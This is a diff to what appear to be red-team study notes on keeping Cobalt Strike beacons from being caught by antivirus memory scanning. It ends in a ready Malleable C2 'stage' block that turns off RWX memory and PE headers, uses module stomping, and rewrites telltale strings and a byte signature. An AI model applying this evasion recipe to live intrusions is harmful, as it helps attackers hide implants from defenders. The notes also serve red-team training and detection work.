@@ -32,4 +32,34 @@ beacon memory:
   some AV can detect these beacons via memory scanning capabilities
   RWX memory:
     most applications do not use RWX memory so it can be a red flag for AV
-    ensure 
+    to avoid this, set stage.userwx to false in Malleable C2
+  DLL headers:
+    when the beacon is loaded into memory, it includes the PE headers which makes it obvious a PE is running
+    to avoid this, set stage.copy_pe_header to false
+  module stomping:
+    memory sections of a loaded PE are typically backed by a module on disk (b/c that's where they were loaded from)
+    the beacon PE would have no module backing it as it was loaded from memory, which could be a red flag to an AV
+    to avoid this, use stage.module_x64 (e.g. set stage.module_x64 "Hydrogen.dll") 
+      NOTE: ensure you select a PE that is at least 512KB
+
+strings:
+  hardcoded strings in the .rdata and .text sections can trigger memory-based detections
+  we can use BEACON_RDLL_GENERATE to get a raw DLL so we can search for strings (https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_hooks.htm#BEACON_RDLL_GENERATE)
+  then running "strings -d beacon_raw.x64.dll" will likely output format strings related to beacon output
+  to avoid this, we can replace these strings within the Malleable C2 profile using stage.transform-x64 and strrep
+    NOTE: when using strrep, the new string must be short or equal to original length, and we must keep the format strings valid (e.g. %s for strings)
+example of stage within Malleable C2...
+  stage {
+      set userwx "false";
+      set cleanup "true";
+      set copy_pe_header "false";
+      set module_x64 "Hydrogen.dll";
+      
+      transform-x64 {
+          strrep "beacon.x64.dll" "bacon.x64.dll";
+          strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
+          strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
+          strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
+          strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
+      }
+  }
